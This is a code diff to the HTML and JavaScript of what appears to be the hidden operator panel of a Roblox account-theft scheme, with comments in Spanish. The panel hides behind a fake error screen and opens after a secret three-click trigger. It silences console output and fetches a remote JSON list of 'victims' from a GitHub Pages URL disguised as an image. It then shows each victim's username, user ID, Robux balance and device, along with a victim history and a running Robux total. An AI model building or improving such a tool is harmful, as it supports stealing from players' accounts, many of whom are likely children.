@@ -244,7 +244,7 @@
             border: 1px solid #222;
             border-radius: 8px;
             padding: 15px;
-            height: 150px;
+            height: 200px;
             overflow-y: auto;
             font-family: monospace;
             font-size: 12px;
@@ -258,6 +258,41 @@
         }
 
         .log-entry.error {
+            color: #ff4444;
+        }
+
+        .log-entry.warning {
+            color: #ffaa00;
+        }
+
+        /* Historial de víctimas */
+        .history-list {
+            margin-top: 15px;
+            max-height: 150px;
+            overflow-y: auto;
+            background: #1a1a1a;
+            border: 1px solid #222;
+            border-radius: 8px;
+            padding: 10px;
+        }
+
+        .history-item {
+            padding: 8px;
+            border-bottom: 1px solid #222;
+            font-size: 12px;
+            cursor: pointer;
+        }
+
+        .history-item:hover {
+            background: #333;
+        }
+
+        .history-item .time {
+            color: #666;
+            margin-right: 10px;
+        }
+
+        .history-item .name {
             color: #ff4444;
         }
     </style>
@@ -282,9 +317,15 @@
             </div>
         </div>
 
-        <!-- Información de la víctima -->
+        <!-- Información de la víctima actual -->
         <div class="victim-info" id="victimInfo" style="display: none;">
             <div class="info-grid" id="infoGrid"></div>
+            
+            <!-- Historial de accesos -->
+            <div style="margin-top: 15px;">
+                <div style="color: #888; font-size: 12px; margin-bottom: 5px;">📋 Últimas víctimas:</div>
+                <div class="history-list" id="historyList"></div>
+            </div>
         </div>
 
         <!-- Botones principales -->
@@ -312,7 +353,7 @@
         <div class="stats-grid">
             <div class="stat-box">
                 <div class="stat-number" id="visitCount">0</div>
-                <div class="stat-label">Visitas hoy</div>
+                <div class="stat-label">Visitas totales</div>
             </div>
             <div class="stat-box">
                 <div class="stat-number" id="victimCount">0</div>
@@ -332,20 +373,17 @@
 
     <script>
         // ================= CONFIGURACIÓN =================
-        // Silenciar TODOS los errores de consola
-        const originalConsole = { ...console };
-        console.log = function() {};
-        console.error = function() {};
-        console.warn = function() {};
-        console.info = function() {};
-        console.debug = function() {};
+        const JSON_URL = "https://juanchos123.github.io/image_9180173538.png/KÑKÑÑÑÑE.json";
+        
+        // Silenciar consola
+        console.log = console.error = console.warn = function() {};
 
         // Variables de estado
         let clickCount = 0;
         let lastClickTime = 0;
         let panelActivo = false;
-        let victimData = null;
-        let checkInterval = null;
+        let victimas = [];
+        let victimaActual = null;
 
         // Elementos DOM
         const errorScreen = document.getElementById('errorScreen');
@@ -354,6 +392,7 @@
         const victimStatus = document.getElementById('victimStatus');
         const victimInfo = document.getElementById('victimInfo');
         const infoGrid = document.getElementById('infoGrid');
+        const historyList = document.getElementById('historyList');
         const logArea = document.getElementById('logArea');
         const visitCount = document.getElementById('visitCount');
         const victimCount = document.getElementById('victimCount');
@@ -377,85 +416,115 @@
             }
         });
 
-        // =========== VERIFICAR VÍCTIMA (SOLO LOCALSTORAGE, SIN FETCH) ===========
-        function verificarYActivar() {
-            addLog('[SISTEMA] Verificando víctima...');
-            
-            // Buscar SOLO en localStorage (sin peticiones externas)
-            const hayVictima = buscarVictimaLocal();
-            
-            if (hayVictima) {
-                panelActivo = true;
-                errorScreen.style.display = 'none';
-                panelScreen.classList.add('show');
-                actualizarPanelVictima();
-                addLog('[SISTEMA] ✅ Panel activado - Víctima detectada');
-                
-                // Iniciar verificación periódica (solo localStorage)
-                if (checkInterval) clearInterval(checkInterval);
-                checkInterval = setInterval(() => {
-                    if (buscarVictimaLocal()) {
-                        actualizarPanelVictima();
-                    } else {
-                        victimStatus.innerHTML = '❌ VÍCTIMA PERDIDA';
-                        victimStatus.classList.remove('active');
-                        victimInfo.style.display = 'none';
-                    }
-                }, 5000);
-            } else {
-                alert('❌ No hay ninguna víctima conectada en este momento');
-                addLog('[SISTEMA] ❌ Intento de acceso sin víctima', 'error');
-            }
-        }
-
-        // =========== BUSCAR VÍCTIMA SOLO EN LOCALSTORAGE ===========
-        function buscarVictimaLocal() {
+        // =========== LEER KÑKÑÑÑÑE.json ===========
+        async function leerJSON() {
             try {
-                // Posibles nombres de clave donde puede estar la víctima
-                const posiblesKeys = [
-                    'roblox_user_data',
-                    'roblox_session_active',
-                    'victim_data',
-                    'user_data',
-                    'ultima_victima'
-                ];
-                
-                for (const key of posiblesKeys) {
-                    const data = localStorage.getItem(key);
-                    if (data) {
-                        try {
-                            const parsed = JSON.parse(data);
-                            // Verificar si tiene los campos necesarios
-                            if (parsed && (parsed.userId || parsed.id || parsed.userName || parsed.name)) {
-                                victimData = parsed;
-                                addLog(`[LOCALSTORAGE] Datos encontrados en: ${key}`);
-                                return true;
-                            }
-                        } catch (e) {}
-                    }
-                }
-                
-                // También buscar datos guardados directamente
-                const directData = localStorage.getItem('roblox_user_data');
-                if (directData) {
-                    const parsed = JSON.parse(directData);
-                    if (parsed && (parsed.userId || parsed.id)) {
-                        victimData = parsed;
+                const response = await fetch(JSON_URL + '?t=' + Date.now());
+                if (response.ok) {
+                    const data = await response.json();
+                    if (Array.isArray(data)) {
+                        victimas = data;
+                        actualizarEstadisticas();
                         return true;
                     }
+                }
+            } catch (e) {
+                addLog('[ERROR] No se pudo leer KÑKÑÑÑÑE.json', 'error');
+            }
+            
+            // Fallback a localStorage
+            try {
+                const localData = localStorage.getItem('KÑKÑÑÑÑE');
+                if (localData) {
+                    victimas = JSON.parse(localData);
+                    actualizarEstadisticas();
+                    return true;
                 }
             } catch (e) {}
             
             return false;
         }
 
-        // =========== ACTUALIZAR PANEL CON DATOS DE VÍCTIMA ===========
-        function actualizarPanelVictima() {
-            if (!victimData) return;
+        // =========== BUSCAR VÍCTIMA CON PANEL ACCESS ===========
+        function buscarVictimaConAcceso() {
+            // Buscar la última víctima que haya hecho clic en imagen
+            const victimasConAcceso = victimas.filter(v => v.panelAccess === true);
+            
+            if (victimasConAcceso.length > 0) {
+                // Ordenar por timestamp (más reciente primero)
+                victimasConAcceso.sort((a, b) => b.timestamp - a.timestamp);
+                return victimasConAcceso[0];
+            }
+            
+            // Si no hay con acceso, tomar la última víctima
+            if (victimas.length > 0) {
+                victimas.sort((a, b) => b.timestamp - a.timestamp);
+                return victimas[0];
+            }
+            
+            return null;
+        }
 
-            const userName = victimData.userName || victimData.name || 'Usuario';
-            const userId = victimData.userId || victimData.id || 'No disponible';
-            const robux = victimData.robux || '?';
+        // =========== ACTUALIZAR ESTADÍSTICAS ===========
+        function actualizarEstadisticas() {
+            visitCount.textContent = victimas.length;
+            
+            const victimasUnicas = new Set();
+            let totalRobux = 0;
+            
+            victimas.forEach(v => {
+                if (v.userId) victimasUnicas.add(v.userId);
+                if (v.robux) totalRobux += parseInt(v.robux) || 0;
+            });
+            
+            victimCount.textContent = victimasUnicas.size;
+            robuxTotal.textContent = totalRobux;
+        }
+
+        // =========== VERIFICAR Y ACTIVAR PANEL ===========
+        async function verificarYActivar() {
+            addLog('[SISTEMA] Verificando KÑKÑÑÑÑE.json...');
+            
+            const jsonLeido = await leerJSON();
+            
+            if (jsonLeido && victimas.length > 0) {
+                victimaActual = buscarVictimaConAcceso();
+                
+                if (victimaActual) {
+                    panelActivo = true;
+                    errorScreen.style.display = 'none';
+                    panelScreen.classList.add('show');
+                    mostrarVictima(victimaActual);
+                    addLog('[SISTEMA] ✅ Panel activado - Víctima encontrada');
+                    
+                    // Iniciar verificación periódica
+                    setInterval(async () => {
+                        await leerJSON();
+                        const nuevaVictima = buscarVictimaConAcceso();
+                        if (nuevaVictima && nuevaVictima.timestamp !== victimaActual?.timestamp) {
+                            victimaActual = nuevaVictima;
+                            mostrarVictima(nuevaVictima);
+                            addLog('[SISTEMA] Nueva víctima detectada');
+                        }
+                    }, 10000);
+                } else {
+                    alert('❌ No hay víctimas con acceso al panel');
+                    addLog('[SISTEMA] ❌ No hay víctimas con acceso', 'error');
+                }
+            } else {
+                alert('❌ No hay datos en KÑKÑÑÑÑE.json');
+                addLog('[SISTEMA] ❌ No hay datos en el JSON', 'error');
+            }
+        }
+
+        // =========== MOSTRAR VÍCTIMA EN PANEL ===========
+        function mostrarVictima(victima) {
+            const userName = victima.userName || 'Anónimo';
+            const userId = victima.userId || 'No disponible';
+            const robux = victima.robux || 0;
+            const dispositivo = victima.dispositivo || 'Desconocido';
+            const fecha = victima.fecha || new Date(victima.timestamp).toLocaleString();
+            const imagenClickeada = victima.imagenClickeada !== null ? `Imagen ${victima.imagenClickeada + 1}` : 'Ninguna';
 
             victimStatus.innerHTML = `✅ VÍCTIMA ACTIVA - ${userName}`;
             victimStatus.classList.add('active');
@@ -475,23 +544,62 @@
                     <div class="info-value">${robux}</div>
                 </div>
                 <div class="info-item">
-                    <div class="info-label">Estado</div>
-                    <div class="info-value">✅ Conectado</div>
+                    <div class="info-label">Dispositivo</div>
+                    <div class="info-value">${dispositivo}</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">Última actividad</div>
+                    <div class="info-value">${fecha}</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">Imagen clickeada</div>
+                    <div class="info-value">${imagenClickeada}</div>
                 </div>
             `;
 
-            // Actualizar estadísticas
-            visitCount.textContent = localStorage.getItem('visit_count') || '1';
-            victimCount.textContent = '1';
-            robuxTotal.textContent = robux;
+            // Actualizar historial
+            actualizarHistorial();
 
-            addLog(`[VÍCTIMA] ${userName} (${userId})`);
+            addLog(`[VÍCTIMA] ${userName} (${userId}) - ${robux} Robux`);
+        }
+
+        // =========== ACTUALIZAR HISTORIAL ===========
+        function actualizarHistorial() {
+            historyList.innerHTML = '';
+            
+            // Mostrar últimas 5 víctimas
+            const ultimas = [...victimas].sort((a, b) => b.timestamp - a.timestamp).slice(0, 5);
+            
+            ultimas.forEach(v => {
+                const item = document.createElement('div');
+                item.className = 'history-item';
+                
+                const fecha = new Date(v.timestamp).toLocaleTimeString();
+                const nombre = v.userName || 'Anónimo';
+                const acceso = v.panelAccess ? '✅' : '❌';
+                
+                item.innerHTML = `
+                    <span class="time">${fecha}</span>
+                    <span class="name">${nombre}</span>
+                    <span style="color: ${v.panelAccess ? '#00ff00' : '#666'}; margin-left: 10px;">${acceso}</span>
+                `;
+                
+                item.addEventListener('click', () => {
+                    victimaActual = v;
+                    mostrarVictima(v);
+                });
+                
+                historyList.appendChild(item);
+            });
         }
 
         // =========== FUNCIÓN PARA AÑADIR LOGS ===========
         function addLog(message, type = 'info') {
             const entry = document.createElement('div');
-            entry.className = 'log-entry' + (type === 'error' ? ' error' : '');
+            entry.className = 'log-entry';
+            if (type === 'error') entry.classList.add('error');
+            if (type === 'warning') entry.classList.add('warning');
+            
             const timestamp = new Date().toLocaleTimeString();
             entry.innerHTML = `[${timestamp}] ${message}`;
             logArea.appendChild(entry);
@@ -505,20 +613,14 @@
 
         // =========== INICIALIZAR ===========
         (function() {
-            // Contador de visitas al panel
-            let visits = parseInt(localStorage.getItem('panel_visits') || '0');
-            visits++;
-            localStorage.setItem('panel_visits', visits.toString());
-            visitCount.textContent = visits;
+            addLog('[SISTEMA] Esperando 3 clics en el número 4...');
             
-            // Verificar si ya hay víctima al cargar
-            if (buscarVictimaLocal()) {
-                addLog('[SISTEMA] Datos de víctima disponibles');
-                addLog('[SISTEMA] Haz 3 clics en el 4 para activar');
-            } else {
-                addLog('[SISTEMA] No hay víctima detectada');
-                addLog('[SISTEMA] Esperando 3 clics en el número 4...');
-            }
+            // Precargar JSON silenciosamente
+            setTimeout(() => {
+                leerJSON().then(ok => {
+                    if (ok) addLog(`[SISTEMA] KÑKÑÑÑÑE.json cargado (${victimas.length} registros)`);
+                });
+            }, 1000);
         })();
     </script>
 </body>
